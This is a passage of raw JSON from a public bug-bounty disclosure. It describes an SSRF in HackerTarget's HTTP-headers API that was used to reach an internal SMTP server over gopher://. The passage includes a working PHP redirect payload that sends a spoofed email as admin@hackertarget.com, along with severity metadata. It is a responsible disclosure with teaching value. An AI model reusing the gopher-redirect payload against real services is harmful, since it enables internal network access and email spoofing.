b459a224f3939031364345b5d65f56529dc166\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?response-content-disposition=attachment%3B%20filename%3D%22ht-postfix.png%22%3B%20filename%2A%3DUTF-8%27%27ht-postfix.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026amp;X-Amz-Signature=917370f52830f0187be02a22b9b459a224f3939031364345b5d65f56529dc166\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThere was an internal SMTP server running on the standard port.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSMTP:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e  SMTP stands for Simple Mail Transfer Protocol.\u003c/li\u003e\n\u003cli\u003e It is a TCP/IP protocol that’s used for \u003cstrong\u003esending emails\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIn order to be able to send emails with SMTP we have to first have to know how mail transactions work:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSMTP sessions are initiated after the \u003cstrong\u003eclient\u003c/strong\u003e opens a TCP/IP connection to the server and the \u003cstrong\u003eserver\u003c/strong\u003e responds with a greeting (220)\u003c/li\u003e\n\u003cli\u003eThe \u003cstrong\u003eclient\u003c/strong\u003e sends a \u003ccode\u003eHELO\u003c/code\u003e or \u003ccode\u003eEHLO\u003c/code\u003e with the clients identity (example: \u003ccode\u003eHELO hackertarget.com\u003c/code\u003e which means \u0026quot;Hi I\u0026#39;m hackertarget.com\u0026quot;)\u003c/li\u003e\n\u003cli\u003eNow the client has to perform 3 steps each separated by a \u003cstrong\u003eCRLF\u003c/strong\u003e for a valid SMTP mail transaction:\n\n\u003cul\u003e\n\u003cli\u003eStep 1: \u003ccode\u003eMAIL\u003c/code\u003e: This tells the server \u0026quot;Hey, we\u0026#39;re starting a new email, reset your state\u0026quot;. This is where the email \u0026quot;from\u0026quot; is specified.\u003c/li\u003e\n\u003cli\u003eStep 2: \u003ccode\u003eRCPT\u003c/code\u003e: Tells the server where (who) we want to send the email too.\u003c/li\u003e\n\u003cli\u003eStep 3: \u003ccode\u003eDATA\u003c/code\u003e: This is where the Subject and body of the email are set, and the client indicates the end of the mail data by a new line containing only \u0026quot;.\u0026quot;. This tells the server that the client confirms the email and tells the server to process it and send it.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eHere\u0026#39;s a visualization of the structure of SMTP from \u003ca href=\"/redirect?url=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc5321\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eRFC 5321\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e                  +----------+                +----------+\n      +------+    |          |                |          |\n      | User |\u0026lt;--\u0026gt;|          |      SMTP      |          |\n      +------+    |  Client- |Commands/Replies| Server-  |\n      +------+    |   SMTP   |\u0026lt;--------------\u0026gt;|    SMTP  |    +------+\n      | File |\u0026lt;--\u0026gt;|          |    and Mail    |          |\u0026lt;--\u0026gt;| File |\n      |System|    |          |                |          |    |System|\n      +------+    +----------+                +----------+    +------+\n                            Email client                     SMTP server\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe SMTP Client was the \u0026quot;Get HTTP Headers\u0026quot; function of the API and the the SMTP Server was the service running on an internal port.\u003c/p\u003e\n\n\u003ch1 id=\"leveraging-the-ssrf-to-send-emails\"\u003eLeveraging the SSRF to send emails:\u003c/h1\u003e\n\n\u003cp\u003eThe API function was using libcurl to execute the requests \u003cem\u003eand\u003c/em\u003e it was following redirects. The libcurl library supports an overabundance of protocols including \u003ccode\u003egopher://\u003c/code\u003e which essentially sends 1 character, a new line (CR+LF), and the remaining data, which allows people to send a multiline requests. This means we can use gopher to send valid commands to the SMTP server and send emails.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ehttp://\u0026lt;server\u0026gt;/mail.php:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$commands\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;HELO hackertarget.com\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;MAIL FROM: \u0026lt;admin@hackertarget.com\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;RCPT To: \u0026lt;cdl@oou.us\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;DATA\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;Subject: corben!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;Corben (cdl) was here, woot woot!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nv\"\u003e$payload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eimplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;%0A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$commands\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Location: gopher://0:25/_\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$payload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis responds with a 302 redirect to the internal SMTP server with the valid commands to send an email.\u003c/p\u003e\n\n\u003cp\u003eI confirmed it worked by visiting the following URL:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ca title=\"https://api.hackertarget.com/httpheaders/?q=http://\" href=\"/redirect?url=https%3A%2F%2Fapi.hackertarget.com%2Fhttpheaders%2F%3Fq%3Dhttp%3A%2F%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.hackertarget.com/httpheaders/?q=http://\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;server\u0026gt;/mail.php \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI checked my email (\u003ca title=\"cdl@oou.us\" href=\"mailto:cdl@oou.us\" rel=\"nofollow noopener noreferrer\"\u003ecdl@oou.us\u003c/a\u003e) and I had an email from \u003ccode\u003eadmin@hackertarget.com\u003c/code\u003e with the subject \u0026quot;corben!\u0026quot; and the body \u0026quot;Corben (cdl) was here, woot woot!\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the proof-of-concept video:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://www.youtube.com/watch?v=F_sC_OrSkIc\" href=\"/redirect?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DF_sC_OrSkIc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.youtube.com/watch?v=F_sC_OrSkIc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eImpact\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003eAn attacker could access internal networks and internal services. I could have sent valid emails from and as HackerTarget.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nCorben Leo (@cdl)\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://hacking.us.com\" href=\"/redirect?url=https%3A%2F%2Fhacking.us.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hacking.us.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://twitter.com/hacker_\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fhacker_\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/hacker_\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":331105,"file_name":"ht-httpheaders.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?response-content-disposition=attachment%3B%20filename%3D%22ht-httpheaders.png%22%3B%20filename%2A%3DUTF-8%27%27ht-httpheaders.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055000Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026X-Amz-Signature=cc9a936c42ec454ebdababc3af5ad1b7917b79d54acadb1ef03dd66320be05a1","file_size":13649,"type":"image/png"},{"id":331111,"file_name":"ht-ssh.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?response-content-disposition=attachment%3B%20filename%3D%22ht-ssh.png%22%3B%20filename%2A%3DUTF-8%27%27ht-ssh.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055000Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026X-Amz-Signature=8e63ffc679516a16ad19f1874e2efb2d71591019e670a5bfef83f5df2e0f3979","file_size":38020,"type":"image/png"},{"id":331112,"file_name":"ht-postfix.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?response-content-disposition=attachment%3B%20filename%3D%22ht-postfix.png%22%3B%20filename%2A%3DUTF-8%27%27ht-postfix.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055000Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026X-Amz-Signature=917370f52830f0187be02a22b9b459a224f3939031364345b5d65f56529dc166","file_size":40915,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":62,"voters":["dyuen","barbie_girl","pudsec","pomme","cdl","kapytein","jobert","michiel","spam404","mik317","and 52 more..."],"severity":{"rating":"high","score":8.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3173999,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-06T19:18:17.000Z","updated_at":"2017-12-06T19:18:17.000Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"cdl","url":"/cdl"},"genius_execution_id":null,"team_handle":"hackertarget","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3174000,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-10T21:40:02.803Z","updated_at":"2018-08-10T21:40:02.803Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hackertarget","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3174085,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-10T22:08:16.604Z","updated_at":"2018-08-10T22:08:16.604Z","additional_data":{"old_severity":null,"new_severity":"High (8.6)","old_severity_id":null,"new_severity_id":194335},"actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hackertarget","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":9756,"category":"researcher","content":"This is a write-up of an SSRF I accidentally found in DNS Dumpster / HackerTarget and leveraged to access to internal services. They **do not**  have a bug bounty program, **do not** test them without their permission. Originally blogged about this here: https://hacking.us.com/blog/hackertarget ","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis is a write-up of an SSRF I accidentally found in DNS Dumpster / HackerTarget and leveraged to access to internal services. They \u003cstrong\u003edo not\u003c/strong\u003e  have a bug bounty program, \u003cstrong\u003edo not\u003c/strong\u003e test them without their permission. Originally blogged about this here: \u003ca title=\"https://hacking.us.com/blog/hackertarget\" href=\"/redirect?url=https%3A%2F%2Fhacking.us.com%2Fblog%2Fhackertarget\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hacking.us.com/blog/hackertarget\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n"}]}